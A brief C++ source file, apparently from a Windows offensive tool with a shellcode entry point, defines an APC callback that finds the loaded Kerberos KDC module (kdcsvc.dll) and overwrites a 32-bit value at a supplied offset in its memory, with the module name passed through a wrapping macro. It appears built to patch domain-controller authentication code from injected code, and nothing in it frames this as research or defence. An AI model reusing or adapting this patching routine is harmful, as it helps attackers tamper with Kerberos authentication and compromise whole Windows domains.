#include "stdafx.h"

//#define _PRINT_CPP_NAMES_
#include "../ScEntry/address.h"

void NTAPI OnApc(_In_ ULONG rva, _In_ ULONG v, _In_ PVOID ImageBase)
{
	CPP_FUNCTION;

	ULONG f = 0;
	UNICODE_STRING name;
	RtlInitUnicodeString(&name, _YW(L"kdcsvc.dll"));
	if (0 <= LdrGetDllHandle(0, &f, &name, &ImageBase))
	{
		*(ULONG*)RtlOffsetToPointer(ImageBase, rva) = v;
	}
}